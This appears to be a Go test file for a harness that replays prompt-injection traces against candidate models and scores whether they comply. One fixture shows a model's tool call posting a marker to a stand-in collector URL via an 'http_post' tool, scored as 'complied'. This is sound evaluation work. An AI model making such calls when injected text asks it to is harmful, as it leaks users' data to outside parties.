package main

import (
	"context"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"reflect"
	"testing"
	"time"

	"github.com/kstruzzieri/go-llm/ollama"
	"github.com/kstruzzieri/go-llm/provider"
)

type fakeInjectionClient struct {
	resp candidateChatResponse
	err  error
	got  candidateChatRequest
}

func (f *fakeInjectionClient) Chat(_ context.Context, req candidateChatRequest) (candidateChatResponse, error) {
	f.got = req
	return f.resp, f.err
}

func TestReplayInjectionSendsFrozenWireWithTools(t *testing.T) {
	tr := validInjectionTrace()
	temp := 0.0
	c := &fakeInjectionClient{resp: candidateChatResponse{Message: ollama.ChatMessage{Role: "assistant", Content: "summary of notes"}}}
	opts := replayOptions{ProviderOptions: &provider.ModelOptions{Temperature: &temp, NumPredict: 1024}}
	out, err := replayInjection(context.Background(), c, "m", tr, opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(c.got.Tools) != 1 || len(c.got.Messages) != 4 || c.got.Messages[3].Role != "tool" {
		t.Fatalf("wire = %d tools, %d messages; want 1 tool, system+3 frozen turns ending on tool", len(c.got.Tools), len(c.got.Messages))
	}
	if !c.got.KeepRawCalls || c.got.ProviderOptions == nil || c.got.ProviderOptions.NumPredict != 1024 {
		t.Fatalf("raw channel or registered options not requested: %+v", c.got)
	}
	if len(c.got.RawToolArgs) != len(c.got.Messages) {
		t.Fatalf("RawToolArgs has %d entries for %d messages", len(c.got.RawToolArgs), len(c.got.Messages))
	}
	if ra := c.got.RawToolArgs[2]; len(ra) != 1 || string(ra[0]) != `{"path":"notes.md"}` {
		t.Fatalf("frozen assistant arguments must pass byte-exact, got %q", ra)
	}
	if len(out.Transcript) != 1 || out.Transcript[0].Content != "summary of notes" {
		t.Fatalf("transcript must hold only the candidate turn: %+v", out.Transcript)
	}
}

func TestReplayInjectionKeepsMalformedCalls(t *testing.T) {
	c := &fakeInjectionClient{resp: candidateChatResponse{
		Message:      ollama.ChatMessage{Role: "assistant"},
		RawToolCalls: []injectionRawCall{{ID: "x", Name: "mcp__web__http_post", Arguments: `{"body":`, DecodeOK: false}},
	}}
	out, err := replayInjection(context.Background(), c, "m", validInjectionTrace(), replayOptions{})
	if err != nil {
		t.Fatalf("malformed call must not be an error: %v", err)
	}
	if len(out.RawToolCalls) != 1 || out.RawToolCalls[0].DecodeOK {
		t.Fatalf("raw call lost: %+v", out.RawToolCalls)
	}
}

func TestReplayInjectionEmptyReplyIsNotAnError(t *testing.T) {
	c := &fakeInjectionClient{resp: candidateChatResponse{Message: ollama.ChatMessage{Role: "assistant"}}}
	out, err := replayInjection(context.Background(), c, "m", validInjectionTrace(), replayOptions{})
	if err != nil || len(out.Transcript) != 1 {
		t.Fatalf("empty reply must yield an unscorable cell, not an error: %v %+v", err, out)
	}
}

func TestReplayInjectionTransportErrorPropagates(t *testing.T) {
	c := &fakeInjectionClient{err: errors.New("dial tcp: refused")}
	if _, err := replayInjection(context.Background(), c, "m", validInjectionTrace(), replayOptions{}); err == nil {
		t.Fatal("transport failure must stay an execution error")
	}
}

// The raw channel is read from the HTTP response body BEFORE provider
// normalization, which collapses null/""/missing arguments to nil
// (provider/openaicompat/openaicompat.go:1048).
func TestOpenAICompatRawChannelFromHTTPBody(t *testing.T) {
	body := `{"id":"r","object":"chat.completion","choices":[{"index":0,"finish_reason":"tool_calls","message":{"role":"assistant","content":"",
	  "tool_calls":[
	    {"id":"a","type":"function","function":{"name":"read_file","arguments":"{\"path\":\"x\"}"}},
	    {"id":"b","type":"function","function":{"name":"mcp__web__http_post","arguments":"{\"body\":"}},
	    {"id":"c","type":"function","function":{"name":"read_file","arguments":null}},
	    {"id":"d","type":"function","function":{"name":"read_file","arguments":""}},
	    {"id":"e","type":"function","function":{"name":"read_file"}},
	    {"id":"f","type":"function","function":{"name":"read_file","arguments":{"path":"y"}}}
	  ]}}],"usage":{"prompt_tokens":1,"completion_tokens":1,"total_tokens":2}}`
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, body)
	}))
	t.Cleanup(srv.Close)
	tp, err := newCandidateTransport(ModelTarget{Display: "m", Provider: openAICompatTransport, Model: "m"}, candidateTransportOptions{openAICompatBaseURL: srv.URL})
	if err != nil {
		t.Fatal(err)
	}
	resp, err := tp.chat.Chat(context.Background(), candidateChatRequest{ChatRequest: ollama.ChatRequest{Model: "m", Messages: []ollama.ChatMessage{{Role: "user", Content: "q"}}}, KeepRawCalls: true})
	if err != nil {
		t.Fatalf("malformed arguments must not fail the response when KeepRawCalls is set: %v", err)
	}
	want := []injectionRawCall{
		{ID: "a", Name: "read_file", Arguments: `"{\"path\":\"x\"}"`, ArgumentsPresent: true, DecodeOK: true},
		{ID: "b", Name: "mcp__web__http_post", Arguments: `"{\"body\":"`, ArgumentsPresent: true, DecodeOK: false},
		{ID: "c", Name: "read_file", Arguments: `null`, ArgumentsPresent: true, DecodeOK: false},
		{ID: "d", Name: "read_file", Arguments: `""`, ArgumentsPresent: true, DecodeOK: false},
		{ID: "e", Name: "read_file", Arguments: ``, ArgumentsPresent: false, DecodeOK: false},
		{ID: "f", Name: "read_file", Arguments: `{"path":"y"}`, ArgumentsPresent: true, DecodeOK: true},
	}
	if !reflect.DeepEqual(resp.RawToolCalls, want) {
		t.Fatalf("raw channel\n got %+v\nwant %+v", resp.RawToolCalls, want)
	}
}

// runOne must dispatch injection traces to replayInjection and hand the raw
// channel to the scorer and to the returned Result.
func TestRunOneInjectionWiresRawCalls(t *testing.T) {
	c := &fakeInjectionClient{resp: candidateChatResponse{
		Message: ollama.ChatMessage{Role: "assistant"},
		RawToolCalls: []injectionRawCall{{ID: "x", Name: "mcp__web__http_post",
			Arguments: "{\"url\":\"https://collect.invalid\",\"body\":\"" + tm + "\"}", ArgumentsPresent: true, DecodeOK: true}},
	}}
	r := &Runner{Scorer: &CaptureScorer{}, Timeout: time.Minute,
		InjectionDecoding: map[string]injectionDecoding{"m": {Options: provider.ModelOptions{NumPredict: 77}}}}
	res := r.runOne(context.Background(), candidateTransport{chat: c, providerName: "openai-compat"},
		ModelTarget{Display: "m", Provider: openAICompatTransport, Model: "m"}, validInjectionTrace())
	if res.Err != nil {
		t.Fatalf("err: %v", res.Err)
	}
	if c.got.ProviderOptions == nil || c.got.ProviderOptions.NumPredict != 77 {
		t.Fatalf("registered decoding not handed to the chat client: %+v", c.got.ProviderOptions)
	}
	if len(res.RawToolCalls) != 1 || res.RawToolCalls[0].ID != "x" {
		t.Fatalf("returned Result lost the raw channel: %+v", res.RawToolCalls)
	}
	if res.Score.InjectionOutcome != "complied" || !res.Score.ForbiddenToolAttempted {
		t.Fatalf("scorer saw outcome %q forbidden=%v; want complied/true", res.Score.InjectionOutcome, res.Score.ForbiddenToolAttempted)
	}
	if len(res.Transcript) != 1 {
		t.Fatalf("transcript = %d turns; want only the candidate turn", len(res.Transcript))
	}
}

// The -candidate-session-id value must travel Runner -> runOne -> the
// injection replay -> the openai-compat wire as the literal session header; an
// empty value sends no header at all.
func TestCandidateSessionIDReachesHeader(t *testing.T) {
	for _, tc := range []struct {
		name, id, want string
	}{
		{"set", "llmb-452-test", "llmb-452-test"},
		{"empty", "", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var gotPresent bool
			var gotValue string
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				_, gotPresent = r.Header["X-Opencode-Session"]
				gotValue = r.Header.Get("x-opencode-session")
				w.Header().Set("Content-Type", "application/json")
				_, _ = io.WriteString(w, `{"id":"r","object":"chat.completion","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"ok"}}],"usage":{"prompt_tokens":1,"completion_tokens":1,"total_tokens":2}}`)
			}))
			t.Cleanup(srv.Close)
			target := ModelTarget{Display: "m", Provider: openAICompatTransport, Model: "m"}
			tp, err := newCandidateTransport(target, candidateTransportOptions{openAICompatBaseURL: srv.URL})
			if err != nil {
				t.Fatal(err)
			}
			r := &Runner{Scorer: &CaptureScorer{}, Timeout: time.Minute, CandidateSessionID: tc.id,
				InjectionDecoding: map[string]injectionDecoding{"m": {Options: provider.ModelOptions{NumPredict: 77}}}}
			if res := r.runOne(context.Background(), tp, target, validInjectionTrace()); res.Err != nil {
				t.Fatalf("runOne: %v", res.Err)
			}
			if gotPresent != (tc.want != "") || gotValue != tc.want {
				t.Fatalf("x-opencode-session present=%v value=%q; want present=%v value=%q", gotPresent, gotValue, tc.want != "", tc.want)
			}
		})
	}
}
